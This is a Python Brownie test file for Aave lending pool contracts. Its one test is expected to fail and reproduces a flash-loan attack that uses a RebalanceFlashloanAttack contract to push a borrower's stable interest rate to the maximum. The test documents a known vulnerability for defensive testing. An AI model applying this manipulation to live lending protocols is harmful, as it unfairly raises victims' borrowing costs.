from brownie import (
    accounts, AToken, AaveOracle, DelegationAwareAToken,
    DefaultReserveInterestRateStrategy, GenericLogic,
    LendingPool, LendingPoolAddressesProvider, LendingPoolConfigurator,
    LendingPoolAddressesProviderRegistry, LendingPoolCollateralManager,
    MintableDelegationERC20, RebalanceFlashloanAttack,
    reverts, ReserveLogic, StableDebtToken, ValidationLogic, VariableDebtToken,
    WETH9, ZERO_ADDRESS, web3
)

from helpers import (
    INTEREST_RATE_MODE_STABLE, INTEREST_RATE_MODE_NONE,
    setup_borrow,
)

import pytest

# Manipulate user's stable rate to the maximum value
@pytest.mark.xfail(reason='Unfairly raises a users stable rate to the maximum')
def test_rebalance_attack():
    attack_contract = accounts[0].deploy(RebalanceFlashloanAttack)

    (addresses_provider, lending_pool, configurator, collateral_manager,
    pool_admin, emergency_admin, price_oracle, lending_rate_oracle, weth, weth_atoken,
    weth_stable_debt, weth_variable_debt, strategy, depositer, deposit_amount, borrower,
    terc20, terc20_atoken, terc20_stable_debt, terc20_variable_debt, tecr20_ltv, tecr20_threshold, tecr20_bonus,
    terc20_deposit_amount, price) = setup_borrow()

    # `borrow()` stable rate for a user
    borrow_amount = terc20_deposit_amount // 100
    tx = lending_pool.borrow(
        weth.address,
        borrow_amount,
        INTEREST_RATE_MODE_STABLE,
        0,
        borrower,
        {'from': borrower},
    )

    # Deposit WETH and transfer to attack_contract (enough to cover premium of flashloan)
    weth.deposit({'from': accounts[0], 'value': deposit_amount})
    weth.transfer(attack_contract.address, deposit_amount, {'from': accounts[0]})

    # Use flashloan to manipulate users rate to max stable rate
    available_liquidity = weth.balanceOf(weth_atoken.address)
    tx_b = attack_contract.attackRebalanceFlashloan(
        lending_pool.address,
        [weth.address],
        [available_liquidity],
        [INTEREST_RATE_MODE_NONE],
        borrower,
        b'',
    )

    max_stable_rate = strategy.stableRateSlope1() + strategy.stableRateSlope2() + lending_rate_oracle.getMarketBorrowRate(weth)
    assert weth_stable_debt.getUserStableRate(borrower) < max_stable_rate
